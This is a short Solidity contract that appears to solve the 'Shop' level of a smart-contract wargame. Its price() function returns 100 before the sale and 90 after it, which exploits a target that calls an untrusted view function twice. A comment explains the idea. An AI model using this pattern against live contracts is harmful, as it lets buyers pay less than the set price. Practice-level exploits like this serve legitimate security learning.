//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import {Shop} from "../instances/Ilevel21.sol";

/*
 *  @idea notice the state change happening in isSold, it's false
 * before calling buy() and after changes to true, so we return 100
 * when it's false and smthg less tahn 100 when it's true 
 */

contract Buyer {
    Shop target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function attack() external {
        target.buy();
    }

    function price() external view returns (uint256) {
        if (target.isSold() == true) return uint256(90);
        if (target.isSold() == false) return uint256(100);
    }
}
